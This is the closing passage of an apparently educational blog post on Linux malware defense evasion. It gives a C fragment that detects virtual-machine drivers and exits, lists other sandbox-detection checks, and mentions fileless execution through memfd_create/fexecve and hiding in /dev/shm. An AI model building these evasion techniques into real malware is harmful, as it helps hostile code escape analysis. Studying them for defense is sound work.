                <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span> 
        <span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="n">e</span><span class="p">;</span>

        <span class="k">while</span><span class="p">((</span><span class="n">e</span><span class="o">=</span><span class="n">readdir</span><span class="p">(</span><span class="n">dir</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">){</span>
                <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">drivers</span><span class="p">)</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
                        <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">drivers</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"VM driver found!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span> <span class="n">_exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
        <span class="p">}</span>	
<span class="p">}</span>
</code></pre></div></div>
<p>The above source sode snippet will look for unsual drivers that are included in guest machines to detect for the present of a VM.</p>

<p>The following are some of the other things that can be checked.</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">Kernel Logz</code>: The Kernel log <code class="language-plaintext highlighter-rouge">dmesg</code> can contain information that maybe useful in determining if we are running in a VM.</li>
  <li><code class="language-plaintext highlighter-rouge">Shared Libraries</code> <code class="language-plaintext highlighter-rouge">/usr/lib/*</code></li>
  <li><code class="language-plaintext highlighter-rouge">Kernel Modules</code> <code class="language-plaintext highlighter-rouge">/lib/modules/5.16.0-kali7-amd64/modules.builtin</code>.</li>
  <li><code class="language-plaintext highlighter-rouge">Services and Processes</code>: There can be specific process and services that can be check to detect the kind of environment that we are in.</li>
  <li><code class="language-plaintext highlighter-rouge">hostnamectl</code>: The hostname can aloso be an indicator to determine the type of environment we are on.</li>
  <li><code class="language-plaintext highlighter-rouge">Disk Size</code> : Most VMs are allocated smaller sizes for their disks compared to a real linux hosts.</li>
</ul>

<p>There will be a later detailed post on Linux sandbox/VM/Container detection, keep watch.</p>

<h3 id="honorable-mentions">Honorable Mentions</h3>

<p><code class="language-plaintext highlighter-rouge">Fileless Execution</code> - A dropper can be installed to run a second staged payload using <strong><em>memfd_create()</em></strong> and <strong><em>fexecve()</em></strong> syscalls.</p>

<p><code class="language-plaintext highlighter-rouge">Hidden Artifacts</code> - A malware may copy itself in the <code class="language-plaintext highlighter-rouge">/dev/shm</code> directory to run in the context of the host’s RAM, therefore leaving no traces after a reboot.</p>

<h3 id="references">References</h3>

<ul>
  <li>[1] https://attack.mitre.org/tactics/TA0005/</li>
</ul>


  </div>

  <a class="u-url" href="/2023/07/15/linux-malware-defense-evasion.html" hidden></a>
</article>

      </div>
    </main><link id="fa-stylesheet" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css">

<footer class="site-footer h-card">
  <data class="u-url" value="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
      </div>
      <div class="footer-col">
        <p></p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"><li>
    <a rel="me" href="https://x.com/BinaryChunk" target="_blank" title="BinaryChunk on X">
      <span class="grey fa-brands fa-x-twitter fa-lg"></span>
    </a>
  </li><li>
    <a rel="me" href="https://github.com/mutur4" target="_blank" title="BinaryChunk on Github">
      <span class="grey fa-brands fa-github fa-lg"></span>
    </a>
  </li>
</ul>
</div>

  </div>

</footer>

</body>

</html>
